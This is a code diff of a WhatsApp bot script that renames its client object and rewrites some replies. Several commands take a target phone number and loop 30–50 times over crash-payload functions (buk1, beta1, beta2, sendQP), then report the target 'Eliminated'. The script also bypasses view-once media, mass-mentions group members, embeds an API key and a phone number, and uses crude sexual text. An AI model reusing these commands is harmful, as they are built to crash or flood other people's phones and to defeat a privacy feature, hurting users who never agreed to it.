@@ -808,7 +808,7 @@ buttons: [{
 }) 
 })} 
 }}, {userJid: m.sender, quoted: m}) 
-await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
+await rejeong.relayMessage(freesex.key.remoteJid, freesex.message, { 
 messageId: freesex.key.id 
 })
 }
@@ -878,7 +878,7 @@ footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }), 
 header: proto.Message.InteractiveMessage.Header.create({ 
-hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
+hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: rejeong.waUploadToServer })) 
 }), 
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
 buttons: [{
@@ -892,7 +892,7 @@ buttons: [{
 }) 
 })} 
 }}, {userJid: m.sender, quoted: m}) 
-await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
+await rejeong.relayMessage(freesex.key.remoteJid, freesex.message, { 
 messageId: freesex.key.id 
 })
 }
@@ -960,7 +960,7 @@ footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }), 
 header: proto.Message.InteractiveMessage.Header.create({ 
-hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
+hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: rejeong.waUploadToServer })) 
 }), 
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
 buttons: [{
@@ -974,7 +974,7 @@ buttons: [{
 }) 
 })} 
 }}, {userJid: m.sender, quoted: m}) 
-await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
+await rejeong.relayMessage(freesex.key.remoteJid, freesex.message, { 
 messageId: freesex.key.id 
 })
 }
@@ -983,8 +983,8 @@ break
 case 'z': case 'hidetag':
 //if (!isRegistered) return registerbut(noregis)
 if (!isOwner) return reply(mess.only.owner)
-if (!text) return reply(`Teks?`)
-zyn.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
+if (!text) return reply(`What should i tell these mfs?`)
+rejeong.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
 break
 
 
@@ -993,7 +993,7 @@ if (!isGroup) return reply('Only Group')
 if (!isAdmins && !isOwner) return reply('Only Admin')
 if (!isBotAdmins) return reply(`Bot is not admin :(`)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await zyn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
+await rejeong.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
 }
 break
 
@@ -1005,7 +1005,7 @@ if (!isGroup) return reply('Only Group')
 if (!isAdmins && !isOwner) return reply('Only Admin')
 if (!isBotAdmins) return reply(`Bot not admin :(`)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await zyn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
+await rejeong.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
 }
 break
 
@@ -1014,7 +1014,7 @@ if (!isGroup) return reply('Only Group')
 if (!isAdmins && !isOwner) return reply('Only Admin')
 if (!isBotAdmins) return reply(`Bot not admin :(`)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await zyn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
+await rejeong.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
 }
 break
 
@@ -1026,12 +1026,12 @@ if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 50; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
+await buk1(rejeong, target, "p", 1020000, ptcp = true);
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
+await beta2(rejeong, target, wanted)
 await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
+await beta1(rejeong, target, wanted)
 }
 reply(`『 Re-Jeong Eliminated』
 
@@ -1048,12 +1048,12 @@ if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 50; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
+await buk1(rejeong, target, "p", 1020000, ptcp = true);
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
+await beta2(rejeong, target, wanted)
 await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
+await beta1(rejeong, target, wanted)
 }
 reply(`『 Re-Jeong Eliminated』
 
@@ -1070,12 +1070,12 @@ if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 30; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
+await buk1(rejeong, target, "p", 1020000, ptcp = true);
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
+await beta2(rejeong, target, wanted)
 await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
+await beta1(rejeong, target, wanted)
 }
 reply(`『 Re-Jeong Eliminated』
 
@@ -1092,11 +1092,11 @@ if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 40; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
+await buk1(rejeong, target, "p", 1020000, ptcp = true);
 await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
+await beta2(rejeong, target, wanted)
 await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
+await beta1(rejeong, target, wanted)
 }
 reply(`『 Re-Jeong Eliminated』
 
@@ -1113,12 +1113,12 @@ if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 40; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
+await buk1(rejeong, target, "p", 1020000, ptcp = true);
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
+await beta2(rejeong, target, wanted)
 await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
+await beta1(rejeong, target, wanted)
 }
 reply(`『 Re-Jeong Eliminated』
 
@@ -1130,7 +1130,7 @@ reply(`『 Re-Jeong Eliminated』
 break
 
 case "rejeong": case "owner": case "guanxii": 
- zyn.sendMessage(m.chat, { video: { url: 'https://telegra.ph/file/019207dd7bf306d343b7e.jpg' }, caption: `Don't Dm for no reason 💀 here is my owner's contact http//wa.me/27623649420 Re-Jeong Guanxii 💀` }, {quoted: m}); 
+ rejeong.sendMessage(m.chat, { video: { url: 'https://telegra.ph/file/019207dd7bf306d343b7e.jpg' }, caption: `Don't Dm for no reason 💀 here is my owner's contact http//wa.me/27623649420 Re-Jeong Guanxii 💀` }, {quoted: m}); 
   
  break;
 
@@ -1138,7 +1138,7 @@ case "addowner":
 if (!isOwner) return reply(mess.only.owner)
 if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
-let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
+let ceknye = await rejeong.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return reply(`number not valid!!!`)
 ownerNumber.push(bnnd)
 fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
@@ -1165,7 +1165,7 @@ break
 
 case 'self': {
 if (!isOwner) return reply(mess.only.owner)
-zyn.public = false
+rejeong.public = false
 reply('Succes Mode Private')
 }
 break
@@ -1174,7 +1174,7 @@ case "addprem":{
 if (!isOwner) return reply(mess.only.owner)
 if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
-let ceknya = await zyn.onWhatsApp(prrkek)
+let ceknya = await rejeong.onWhatsApp(prrkek)
 if (ceknya.length == 0) return reply(`number not valid!!`)
 prem.push(prrkek)
 fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
@@ -1195,13 +1195,13 @@ break
 
 case 'public': {
 if (!isOwner) return reply(mess.only.owner)
-zyn.public = true
+rejeong.public = true
 reply('Succes Mode Public')
 }
 break
 
 case 'sc': case 'script': case 'repo':{
-zyn.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/019207dd7bf306d343b7e.jpg` }, caption: 
+rejeong.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/019207dd7bf306d343b7e.jpg` }, caption: 
 `👋🏻 Hello *${pushname}*, Unfortunately you can't get the sc\n\nEnjoy and have fun with me😜!\n\nMy owner is Re-Jeong Guanxii!` });
 }
 break
@@ -1210,26 +1210,26 @@ case "linkgroup": case "link":{
 if (!isGroup) return reply('Only Group')
 if (!isAdmins && !isOwner) return reply('Only Admin')
 if (!isBotAdmins) return reply(`Bot not admin :(`)
-let response = await zyn.groupInviteCode(m.chat); 
-zyn.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject} By Re-Jeong`, m, { detectLink: true }); 
+let response = await rejeong.groupInviteCode(m.chat); 
+rejeong.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject} By Re-Jeong`, m, { detectLink: true }); 
 }
 break
 		
 case "alive": case 'runtime':{ 
-zyn.sendMessage(m.chat, { video: { url: 'https://telegra.ph/file/019207dd7bf306d343b7e.jpg' }, caption: `Hey @ ${m.pushName}, Re-Jeong Has been alive since  ${runtime(process.uptime())}`, fileLength: "9999999999898989899999999" }, { quoted: m }); 
+rejeong.sendMessage(m.chat, { video: { url: 'https://telegra.ph/file/019207dd7bf306d343b7e.jpg' }, caption: `Hey @ ${m.pushName}, Re-Jeong Has been alive since  ${runtime(process.uptime())}`, fileLength: "9999999999898989899999999" }, { quoted: m }); 
 }
 break
 
 case 'ping':{
-zyn.sendMessage(from, { react: { text: "💀", key: m.key } })
+rejeong.sendMessage(from, { react: { text: "💀", key: m.key } })
 const startTime = new Date();
-const pingMsg = await zyn.sendMessage(m.chat, { text: 'Re-Jeong...*' }, { quoted: m });
-await zyn.relayMessage(m.chat, {
+const pingMsg = await rejeong.sendMessage(m.chat, { text: 'Re-Jeong...*' }, { quoted: m });
+await rejeong.relayMessage(m.chat, {
 protocolMessage: {
 key: pingMsg.key,
 type: 14,
 editedMessage: {
-conversation: `Re-Jeong-V4 response speed* *${new Date() - startTime}* ms`
+conversation: `My name is *Re-Jeong* i am *${new Date() - startTime}* ms faster. Jus like you💦 cum in 14 seconds`
 }
 }
 }, {});
@@ -1263,7 +1263,7 @@ mp3Buffer = Buffer.from(mp3DownloadResponse.data);
 console.error("Error downloading MP3:", error);
 return reply("Failed to download the MP3. Please try again.");
 }
-await zyn.sendMessage(m.chat, {
+await rejeong.sendMessage(m.chat, {
 audio: mp3Buffer,
 fileName: anup3k.title + '.mp3',
 mimetype: 'audio/mp4',
@@ -1304,15 +1304,15 @@ if (!m.quoted) return m.reply("Quote a viewonce media!")
 if (m.quoted.message) {
             let type = Object.keys(m.quoted.message)[0]
             let q = m.quoted.message[type]
-            let media = await zyn.downloadMediaMessage(q)
+            let media = await rejeong.downloadMediaMessage(q)
             if (/video/.test(type)) {
 
 
-               await zyn.sendMessage(m.chat, { video: media, caption: `Retrieved by Re-Jeong💦\nOriginal caption: ${q.caption}`}, { quoted: m})
+               await rejeong.sendMessage(m.chat, { video: media, caption: `Retrieved by Re-Jeong💦\nOriginal caption: ${q.caption}`}, { quoted: m})
 
             } else if (/image/.test(type)) {
 
-await zyn.sendMessage(m.chat, { image: media, caption: `Retrieved by Re-Jeong 💦\nOriginal caption: ${q.caption}`}, { quoted: m})
+await rejeong.sendMessage(m.chat, { image: media, caption: `Retrieved by Re-Jeong 💦\nOriginal caption: ${q.caption}`}, { quoted: m})
 
             }
          } else m.reply("That is not a viewonce media. . .")
@@ -1327,7 +1327,7 @@ case "apk":
           if (!text) return reply("Please type the app name");
         let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
         let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
-         await zyn.sendMessage(
+         await rejeong.sendMessage(
               m.chat,
               {
                 document: { url: tylor.BK9.dllink },
@@ -1349,12 +1349,12 @@ case "apk":
       break;
 		
 case 'weather':
-        zyn.sendMessage(from, { react: { text: "✨", key: m.key } })
+        rejeong.sendMessage(from, { react: { text: "✨", key: m.key } })
         if (!args[0]) return reply("Enter your location to search weather.")
         myweather = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args.join(" ")}&units=metric&appid=e409825a497a0c894d2dd975542234b0&language=tr`)
 
         const weathertext = `           🌤 *Weather Report* 🌤  \n\n🔎 *Search Location:* ${myweather.data.name}\n*💮 Country:* ${myweather.data.sys.country}\n🌈 *Weather:* ${myweather.data.weather[0].description}\n🌡️ *Temperature:* ${myweather.data.main.temp}°C\n❄️ *Minimum Temperature:* ${myweather.data.main.temp_min}°C\n📛 *Maximum Temperature:* ${myweather.data.main.temp_max}°C\n💦 *Humidity:* ${myweather.data.main.humidity}%\n🎐 *Wind:* ${myweather.data.wind.speed} km/h\n`
-        zyn.sendMessage(from, { video: { url: 'https://media.tenor.com/bC57J4v11UcAAAPo/weather-sunny.mp4' }, gifPlayback: true, caption: weathertext }, { quoted: m })
+        rejeong.sendMessage(from, { video: { url: 'https://media.tenor.com/bC57J4v11UcAAAPo/weather-sunny.mp4' }, gifPlayback: true, caption: weathertext }, { quoted: m })
 
         break;
 
@@ -1381,7 +1381,7 @@ case "play":{
 	let telaso = search.all[0].url;
  await reply();
 	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
-await zyn.sendMessage(m.chat, {
+await rejeong.sendMessage(m.chat, {
   document: {url: kyuu.result.mp3},
 mimetype: "audio/mp3",
  fileName: `${kyuu.result.title}.mp3`,
@@ -1397,7 +1397,7 @@ mimetype: "audio/mp3",
         }
       }
     }, { quoted: m });
-    zyn.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
+    rejeong.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
 break
 
@@ -1409,7 +1409,7 @@ case "video":{
 	let telaso = search.all[0].url;
     await reply();
 	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
-await zyn.sendMessage(m.chat, {
+await rejeong.sendMessage(m.chat, {
  document: {url: kyuu.result.mp4},
 mimetype: "video/mp4",
  fileName: `${search.all[0].title}.mp4`,
@@ -1425,14 +1425,14 @@ mimetype: "video/mp4",
         }
       }
     }, { quoted: m });
-    zyn.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
+    rejeong.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
 break
 
 case 'pic':
       case 'img':
       case 'image': {
-        zyn.sendMessage(from, { react: { text: "⌛", key: m.key } });
+        rejeong.sendMessage(from, { react: { text: "⌛", key: m.key } });
 
         if (!args[0]) return reply("Enter a search term to get Google Image!");
 	let gis = require('g-i-s');
@@ -1454,7 +1454,7 @@ case 'pic':
             footer: `${global.BotName}`,
             headerType: 4,
           };
-          zyn.sendMessage(m.chat, buttonMessage, { quoted: m });
+          rejeong.sendMessage(m.chat, buttonMessage, { quoted: m });
         });
       }
         break;
@@ -1489,15 +1489,15 @@ case "lyrics":
  if (!text) return reply("Provide a song name!"); 
  const searches = await zyn.songs.search(text); 
  const firstSong = searches[0]; 
- //await zyn.sendMessage(from, {text: firstSong}); 
+ //await rejeong.sendMessage(from, {text: firstSong}); 
  const lyrics = await firstSong.lyrics(); 
- await zyn.sendMessage(from, { text: lyrics}, { quoted: m }); 
+ await rejeong.sendMessage(from, { text: lyrics}, { quoted: m }); 
  } catch (error) { 
              reply(`I did not find any lyrics for ${text}. Try searching a different song.`); 
              console.log(error); 
          } 
- //const artist = await zyn.artists.get(456537); 
- //await zyn.sendMessage(from, { text: artist} {quoted: m}); 
+ //const artist = await rejeong.artists.get(456537); 
+ //await rejeong.sendMessage(from, { text: artist} {quoted: m}); 
  // console.log("About the Artist:\n", artist, "\n"); 
  break
 		
@@ -1521,7 +1521,7 @@ reply(String(err))
 }
 } catch (e) {
 console.log(e)
-zyn.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
+rejeong.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
 }
 }
 
